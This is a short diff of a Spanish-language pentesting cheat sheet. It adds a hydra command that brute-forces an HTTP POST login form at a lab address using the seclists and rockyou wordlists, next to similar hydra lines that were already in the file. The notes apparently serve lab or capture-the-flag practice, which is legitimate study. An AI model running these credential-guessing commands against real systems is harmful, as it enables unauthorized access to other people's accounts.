@@ -16,6 +16,12 @@ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p CONT
 hydra -l USER -P archivo.txt<IP> http-post-form  "/login.php:username=^USER^&password=^PASS^:Invalid credentials”
 ```
 
+## Para login php con mensaje:
+
+```bash
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P ../rockyou.txt 172.17.0.2 http-post-form '/DIRECCION:username=^USER^&password=^PASS^:F=Mensaje despues de inssertar creds incorrectas.' -F -V -t 64 -I -u
+```
+
 ## mp64
 
 Relleno de contraseñas:
